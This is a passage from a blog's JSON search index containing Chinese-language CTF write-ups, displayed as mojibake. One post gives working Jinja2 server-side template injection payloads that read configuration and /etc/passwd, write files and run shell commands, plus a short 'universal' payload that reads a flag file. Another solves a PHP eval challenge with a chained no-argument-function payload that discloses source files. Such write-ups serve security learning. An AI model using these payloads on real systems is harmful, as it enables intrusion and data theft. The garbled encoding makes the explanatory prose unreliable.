|ç­‰ï¼Œæ‰€ä»¥åªèƒ½æ˜¯æ‹¿äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°å»æ„é€ ï¼Œ è¿™æ˜¯æˆ‘å†™çš„payloadï¼š config: &#123;&#123;t.__class__.__base__.__subclasses__()[280].__init__.__globals__['current_app'].config&#125;&#125; æ–‡ä»¶è¯»å–ï¼š &#123;&#123;t.__class__.__base__.__subclasses__()[40]('/etc/passwd').read()&#125;&#125; å†™æ–‡ä»¶ï¼š &#123;&#123;t.__class__.__base__.__subclasses__()[40]('1.sh','w').write(\"echo+'Hello,World!'\")&#125;&#125; &#123;&#123;t.__class__.__base__.__subclasses__()[40]('1.sh','a').write(\"echo+'Hello,World!'\")&#125;&#125; å‘½ä»¤æ‰§è¡Œï¼š &#123;&#123;t.__class__.__base__.__subclasses__()[261](\"ls+/\",shell=True,stdout=-1).communicate()[0]&#125;&#125; &#123;&#123;t.__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls+/').read()&#125;&#125; ä½†æ˜¯æˆ‘çš„payloadæ— æ³•è¯»åˆ°äºŒçº§ç›®å½•ï¼Œå¾ˆå¥‡æ€ªï¼Œåæ¥æ‰çŸ¥é“æ˜¯å› ä¸ºpayloadè¢«é™åˆ¶äº†é•¿åº¦ã€‚ è¯»ä¸€ä¸‹æºç ï¼š è¿‡æ»¤æ¡ä»¶ï¼š string = request.values.get(&quot;string&quot;) patter1 = re.compile(r&quot;\\&#123;\\&#123;[a-z]?_[a-z]?\\.|[a-z]?\\&quot;[a-z]*\\.|[a-z]?\\(.?\\)\\.|[a-z]?\\[.?\\]\\.|[a-z]?\\&#39;[a-z]?\\.|\\|&quot;) unsafe_string = patter1.findall(string) if unsafe_string: return render_template_string(&#39;&#39;&#39;&lt;p&gt;hello hacker&lt;/p&gt;&#39;&#39;&#39;) exit(0) patter = re.compile(r&quot;\\&#123;\\&#123;[a-z]&#123;1,4&#125;\\..*|\\&#123;\\&#123;[0-9\\*\\+-]&#123;1,10&#125;\\&#125;\\&#125;|[0-9a-z]*&quot;) template_str = patter.findall(string, 0, 100) if template_str[0] == &quot;&quot;: return render_template_string(&#39;&#39;&#39;&lt;p&gt;You input string unavailable&lt;/p&gt;&#39;&#39;&#39;) exit(0) ç¬¬ä¸€ä¸ªæ­£åˆ™æ˜¯å‰é¢çš„è¿‡æ»¤ï¼Œåé¢çš„å°±æœ‰äº›ç¦»è°±ï¼š å¦‚æœæ˜¯å­—æ¯ï¼Œé‚£ä¹ˆå°±æ˜¯.ä¹‹å‰ä¸èƒ½è¶…è¿‡å››ä¸ªå­—æ¯ï¼Œçº¯æ•°å­—ä¸èƒ½è¶…è¿‡10ä½ã€‚å¹¶æˆªå–å‰100ï¼Œæ‰€ä»¥payloadå­—ç¬¦ä¸²è¶…è¿‡100å°±è¿”å›500çš„åŸå› ã€‚ã€‚ã€‚ æœ€ç»ˆpayloadï¼š &#123;&#123;ads.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"cat+/www/config/flag.txt\").read()&#125;&#125; è¿™å°±æ˜¯adsæ˜¯ä¸å­˜åœ¨çš„ï¼Œads.__init__æ˜¯undefindç±»ï¼Œè°ƒç”¨undefindç±»__globals__ä¸‹çš„__builtins__ç„¶åimport osã€‚ è¿™ä¸ªpayloadæ¯”è¾ƒçŸ­ï¼Œæ‰€ä»¥æ‰§è¡Œçš„å‘½ä»¤å°±å¤šã€‚ã€‚ã€‚ è¿™æ¡payloadçœ‹æ¥ä¹Ÿç®—æ˜¯jinjia2 SSTIé‡Œçš„ä¸‡èƒ½payloadäº† ä¸è¿‡å­¦é•¿åæ¥æ”¹è¿‡æˆ‘çš„payloadåä¹Ÿèƒ½è¯»ï¼ŒTQL,ORZï¼ï¼ï¼ ?string=&#123;&#123;u.__class__.__base__.__subclasses__()[261](%22ls%20/www/*%22,shell=True,stdout=-1).communicate()[0]&#125;&#125; ?string=&#123;&#123;u.__class__.__base__.__subclasses__()[261](%22cat%20/*/*/flag*%22,shell=1,stdout=-1).communicate()&#125;&#125; åæ­£å°±æ˜¯åªè¦çŸ¥é“äº†ç›®å½•å°±å¥½è¯´äº†ã€‚ã€‚ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/"},{"name":"write up","slug":"CTF/write-up","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/write-up/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/tags/CTF/"},{"name":"web","slug":"web","permalink":"https://scr1pt-k1ddi3.github.io/tags/web/"}]},{"title":"ichunqiu-Mercy-code","slug":"ichunqiu-Mercy-code","date":"2022-05-08T09:52:18.000Z","updated":"2022-05-08T10:51:08.502Z","comments":true,"path":"2022/05/08/ichunqiu-Mercy-code/","link":"","permalink":"https://scr1pt-k1ddi3.github.io/2022/05/08/ichunqiu-Mercy-code/","excerpt":"","text":"æºç ï¼š&lt;?php highlight_file(__FILE__); if ($_POST[&#39;cmd&#39;]) &#123; $cmd = $_POST[&#39;cmd&#39;]; if (&#39;;&#39; === preg_replace(&#39;/[a-z_]+\\((?R)?\\)/&#39;, &#39;&#39;, $cmd)) &#123; if (preg_match(&#39;/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i&#39;, $cmd)) &#123; die(&#39;What are you thinking?&#39;); &#125; else &#123; eval($cmd); &#125; &#125; else &#123; die(&#39;Please calm down&#39;); &#125; &#125; æ€è·¯è¿™ä¸ªé¢˜å°±æ˜¯[GXYCTF2019]ç¦æ­¢å¥—å¨ƒçš„æ”¹ç¼–ç‰ˆæœ¬ï¼Œ&#39;;&#39; === preg_replace(&#39;/[a-z_]+\\((?R)?\\)/&#39;, &#39;&#39;, $cmdçš„æ„æ€å°±æ˜¯åªèƒ½æ˜¯æ— å‚æ•°å‡½æ•°ï¼Œæ¶å¿ƒä¸€ç‚¹çš„æ˜¯è¿™é‡ŒåŠ äº†äº¿ç‚¹ç‚¹è¿‡æ»¤ï¼Œå•¥ç©æ„éƒ½è¿‡æ»¤äº†ï¼Œç¯å¢ƒå…³äº†ï¼Œå°±ä»æœ¬åœ°å®éªŒå§ã€‚ ä»ç½‘ä¸Šæ‰¾åˆ°å‡ ç¯‡æ¯”è¾ƒå¥½çš„æ— å‚rceï¼š php rceä¹‹æ— å‚æ•°è¯»æ–‡ä»¶ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· (55æ¡æ¶ˆæ¯) phpæ— å‚æ•°å‡½æ•°å®ç°rce,æ— å‚æ•°è¯»æ–‡ä»¶å’ŒRCEæ€»ç»“_æ˜¥é›ªèŠ³è²çš„åšå®¢-CSDNåšå®¢ åŸå§‹çš„é‚£äº›payloadéƒ½ä¸ç®¡ç”¨ï¼Œè¿™é‡Œä¸»è¦å°±æ˜¯æƒ³åŠæ³•æ„é€ .,ä¸»è¦å½±å“çš„è¿‡æ»¤å°±æ˜¯ arrayã€localeconvã€phpversionã€etã€ntã€sqrtã€ordã€timeåæ­£å°±æ˜¯éƒ½è¿‡æ»¤äº†ä¸ªå·®ä¸å¤šäº†ã€‚ä¸è¿‡æˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªpayloadï¼š print_r(scandir(chr(ord(hebrevc(crypt(time())))))); è§£é‡Šï¼šcrypt()è¿”å›ä½¿ç”¨ DESã€Blowfish æˆ– MD5 ç®—æ³•åŠ å¯†çš„å­—ç¬¦ä¸²ã€‚ hebrevc() å‡½æ•°æŠŠå¸Œä¼¯æ¥æ–‡æœ¬ä»å³è‡³å·¦çš„æµè½¬æ¢ä¸ºå·¦è‡³å³çš„æµã€‚åŒæ—¶ï¼ŒæŠŠæ–°è¡Œï¼ˆ\\nï¼‰è½¬æ¢ä¸º hebrevc(crypt(arg))å¯ä»¥éšæœºç”Ÿæˆä¸€ä¸ªhashå€¼ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦éšæœºæ˜¯$(å¤§æ¦‚ç‡) æˆ–è€… â€œ.â€(å°æ¦‚ç‡) ç„¶åé€šè¿‡chr(ord())åªå–ç¬¬ä¸€ä¸ªå­—ç¬¦&#x2F; ord()è¿”å›å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„Asciiå€¼ã€‚ å®éªŒè¿‡ç¨‹ï¼š å¯ä»¥çœ‹å‡ºæ¥ï¼Œhebrevc()ã€crypt()è¿™ä¸¤ä¸ªå‡½æ•°æ˜¯æ²¡æœ‰è¿‡æ»¤çš„ï¼Œtime()è¿™ä¸ªå‡½æ•°å°±æ˜¯è¿”å›ä¸€ä¸ªæ•°ï¼Œæ¢ä¸€ä¸ªå°±è¡Œï¼Œéšä¾¿ä»æ•°å­¦å‡½æ•°æ‰¾ä¸€ä¸ªå°±è¡Œï¼Œ æ¯”å¦‚ï¼šsin()ï¼Œå¦‚å›¾ï¼š æ•ˆæœä¸€æ ·ã€‚ å…³é”®é—®é¢˜æ˜¯ord()å‡½æ•°è¢«è¿‡æ»¤äº†ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªæ¯”è¾ƒä¸¥é‡çš„é—®é¢˜ï¼Œä¸è¿‡æˆ‘ä»¬åªè¦æ‰¾åˆ°ä¸€ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å°±è¡Œã€‚ æˆ‘æ‰¾åˆ°äº†è¿™ä¸ªå‡½æ•°ï¼Œstr_split() å‡½æ•°ï¼Œè§£é‡Šï¼š str_split() å‡½æ•°æŠŠå­—ç¬¦ä¸²åˆ†å‰²åˆ°æ•°ç»„ä¸­ã€‚ è¯­æ³• str_split(string,length) å‚æ•° æè¿° string å¿…éœ€ã€‚è§„å®šè¦åˆ†å‰²çš„å­—ç¬¦ä¸²ã€‚ length å¯é€‰ã€‚è§„å®šæ¯ä¸ªæ•°ç»„å…ƒç´ çš„é•¿åº¦ã€‚é»˜è®¤æ˜¯ 1ã€‚ æ³¨æ„ï¼š length å¯é€‰ã€‚è§„å®šæ¯ä¸ªæ•°ç»„å…ƒç´ çš„é•¿åº¦ã€‚é»˜è®¤æ˜¯ 1ã€‚ æ‰€ä»¥å°±è¯•è¯•ï¼Œå› ä¸ºæˆ‘ä»¬å°±æ˜¯è¦è¿”å›ç¬¬ä¸€ä¸ª.,ç»“æœï¼š è¿”å›äº†æ•°ç»„æœ‰ä¸€å¤§å †ä¸œè¥¿ã€‚ã€‚ã€‚ æƒ³åŠæ³•æ‰¾ç¬¬ä¸€ä¸ªå¹¶è¾“å‡ºå°±è¡Œï¼Œæˆ‘ä»¬æ³¨æ„åˆ°è™½ç„¶è¿‡æ»¤äº†arrayï¼Œä½†æ˜¯next(),prev()ç­‰å‡½æ•°å¹¶æ²¡æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦å°†æŒ‡é’ˆæŒ‡å‘æ•°ç»„ç¬¬ä¸€ä¸ªå€¼å°±è¡Œï¼Œæˆ‘è¿™é‡Œé€‰çš„æ˜¯next()å’Œeach()æ­é…ï¼Œçè¯•å‡ºæ¥çš„ã€‚ã€‚ã€‚ è¿™é‡Œeach() å‡½æ•°è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚ç„¶ånext()å‡½æ•°å†å‘åç§»åŠ¨ä¸€ä¸‹ï¼Œæ­£å¥½å›å»å¹¶ä¸”è¾“å‡ºã€‚è¿™ä¸å°±æ„é€ å‡ºæ¥äº†å—ğŸ˜ å¤šè¯•å‡ æ¬¡å°±ä¼šè¿”å›.ï¼Œç»“æœå¦‚å›¾ï¼š å†åŠ scandir()ï¼ŒæˆåŠŸè¿”å›ï¼š ä½†æ˜¯é¢˜ç›®ä¸­print_r()å’Œvar_dump()éƒ½è¢«è¿‡æ»¤ï¼Œæ•°ç»„è¾“å‡ºä¸å‡ºæ¥ï¼Œæ‰€ä»¥å°±åªèƒ½ç”¨echo()çŒœä½ç½®ï¼Œé¢˜ç›®ä¸­çŒœæœ€åä¸€ä¸ªæ­£å¥½æ˜¯flagï¼Œå°±ç›´æ¥åŠ ä¸ªend()å‡½æ•°è¯»å°±å®Œäº†ã€‚ payloadï¼š cmd=show_source(end(scandir(next(each(str_split(hebrevc(crypt(sin())))))))); ä¸è¿‡å¥½åƒå¦‚æœæ–‡ä»¶ä¸åœ¨æœ€åä¸€ä¸ªè€Œæ˜¯åœ¨ä¸­é—´ï¼Œé‚£ä¹ˆç”±äºè¿‡æ»¤äº†arrayï¼Œå¥½åƒå°±ä¸å¤ªå¥½è¯»äº†ã€‚ã€‚ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/tags/CTF/"},{"name":"web","slug":"web","permalink":"https://scr1pt-k1ddi3.github.io/tags/web/"},{"name":"rce","slug":"rce","permalink":"https://scr1pt-k1ddi3.github.io/tags/rce/"}]},{"title":"hello world","slug":"hello-world","date":"2021-04-08T06:45:37.000Z","updated":"2022-05-18T12:44:16.072Z","comments":true,"path":"2021/04/08/hello-world/","link":"","permalink":"https://scr1pt-k1ddi3.github.io/2021/04/08/hello-world/","excerpt":"","text":"Hello WorldğŸ‘½!","categories":[{"name":"hello","slug":"hello","permalink":"https://scr1pt-k1ddi3.github.io/categories/hello/"}],"tags":[{"name":"hello","slug":"hello","permalink":"https://scr1pt-k1ddi3.github.io/tags/hello/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/"},{"name":"write up","slug":"CTF/write-up","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/write-up/"},{"name":"hello","slug":"hello","permalink":"https://scr1pt-k1ddi3.github.io/categories/hello/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/tags/CTF/"},{"name":"web","slug":"web","permalink":"https://scr1pt-k1ddi3.github.io/tags/web/"},{"name":"rce","slug":"rce","permalink":"https://scr1pt-k1ddi3.github.io/tags/rce/"},{"name":"hello","slug":"hello","permalink":"https://scr1pt-k1ddi3.github.io/tags/hello/"}]}